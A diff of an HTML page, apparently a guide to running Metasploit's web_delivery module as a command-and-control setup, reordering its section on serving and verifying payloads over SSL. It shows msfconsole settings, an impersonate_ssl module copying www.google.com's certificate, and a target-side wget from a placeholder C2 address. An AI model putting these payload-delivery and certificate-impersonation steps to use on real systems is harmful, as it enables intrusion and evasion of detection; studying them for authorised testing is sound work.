@@ -279,26 +279,19 @@ wget <span style="color:#f92672">-</span>qO <span style="color:#ae81ff">0976</sp
 <p>The SSL certificate can be used:</p>
 <ul>
 <li>When delivering the payload</li>
-<li>When communicating with payload</li>
+<li>When communicating with the payload</li>
 </ul>
 <p>To use an SSL certificate, you can either:</p>
 <ul>
 <li>Let Metasploit generate a certificate</li>
+<li>Impersonate an existing certificate</li>
 <li>Import a certificate</li>
-<li>Impersonate an existing certificate and import it</li>
 </ul>
 <p>To let Metasploit generate the certificate, run the resource script. Before firing the web_delivery script, add:</p>
 <pre><code>msf exploit(multi/script/web_delivery) &gt; set SSL true
 </code></pre><p>And run.</p>
 <p>On the target simply use <code>https://YOUR-C2-EXT-IP/delivery</code> as the wget URL instead of the generated one.</p>
-<p>If you wish to import a certificate from the Docker host, make sure you mounted the required files to the Metasploit container using an additional <code>-v</code> argument, like we did with the <code>docker_delivery.rc</code> file.</p>
-<p>If you want your payload <em>served</em> using a custom SSL cert:</p>
-<pre><code>msf exploit(multi/script/web_delivery) &gt; set SSLCert /path/to/pem
-msf exploit(multi/script/web_delivery) &gt; set SSL true
-</code></pre><p>If you want the payload to verify your custom SSL cert with the handler:</p>
-<pre><code>msf exploit(multi/script/web_delivery) &gt; set HandlerSSLCert /path/to/pem
-msf exploit(multi/script/web_delivery) &gt; set stagerverifysslcert true
-</code></pre><p>If you want to impersonate a certificate, use the dedicated auxillary module:</p>
+<p>If you want to impersonate a certificate, use the dedicated auxillary module:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">msf</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">use</span> <span style="color:#a6e22e">auxiliary</span><span style="color:#f92672">/</span><span style="color:#a6e22e">gather</span><span style="color:#f92672">/</span><span style="color:#a6e22e">impersonate_ssl</span>
 <span style="color:#a6e22e">msf</span> <span style="color:#a6e22e">auxiliary</span>(<span style="color:#a6e22e">impersonate_ssl</span>) <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">set</span> <span style="color:#a6e22e">RHOST</span> <span style="color:#a6e22e">www</span>.<span style="color:#a6e22e">google</span>.<span style="color:#a6e22e">com</span>
 <span style="color:#a6e22e">RHOST</span> =&gt; <span style="color:#a6e22e">www</span>.<span style="color:#a6e22e">google</span>.<span style="color:#a6e22e">com</span>
@@ -315,7 +308,14 @@ msf exploit(multi/script/web_delivery) &gt; set stagerverifysslcert true
 [<span style="color:#f92672">*</span>] <span style="color:#a6e22e">Auxiliary</span> <span style="color:#a6e22e">module</span> <span style="color:#a6e22e">execution</span> <span style="color:#a6e22e">completed</span>
 <span style="color:#a6e22e">msf</span> <span style="color:#a6e22e">auxiliary</span>(<span style="color:#a6e22e">impersonate_ssl</span>) <span style="color:#f92672">&gt;</span> 
 </code></pre></div><p>(<a href="https://www.darkoperator.com/blog/2015/6/14/tip-meterpreter-ssl-certificate-validation">source</a>)</p>
-<h2 id="notes">Notes</h2>
+<p>If you wish to import a certificate from the Docker host, make sure you mounted the required files to the Metasploit container using an additional <code>-v</code> argument, like we did with the <code>docker_delivery.rc</code> file.</p>
+<p>If you want your payload <em>served</em> using a custom SSL cert:</p>
+<pre><code>msf exploit(multi/script/web_delivery) &gt; set SSLCert /path/to/pem
+msf exploit(multi/script/web_delivery) &gt; set SSL true
+</code></pre><p>If you want the payload to verify your custom SSL cert with the handler:</p>
+<pre><code>msf exploit(multi/script/web_delivery) &gt; set HandlerSSLCert /path/to/pem
+msf exploit(multi/script/web_delivery) &gt; set stagerverifysslcert true
+</code></pre><h2 id="notes">Notes</h2>
 <ul>
 <li>If you quit out of the containers using CTRL+C and did not use the <code>--rm</code> option, you&rsquo;ll have to remove the stopped containers to run them again with:</li>
 </ul>
